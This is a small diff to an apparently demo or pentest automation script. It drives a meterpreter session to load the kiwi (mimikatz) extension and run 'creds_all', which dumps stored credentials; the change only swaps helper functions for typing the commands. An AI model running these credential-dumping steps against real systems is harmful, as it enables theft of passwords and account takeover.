@@ -4,10 +4,10 @@
 meterpreter: show creds_all (mimikatz)
 '
 
-paste_command "load kiwi"
-xdotool key Return
+execute_command "load kiwi"
+create_new_line
 sleep 1
 
-paste_command "creds_all"
-xdotool key Return
+execute_command "creds_all"
+create_new_line
 sleep 1
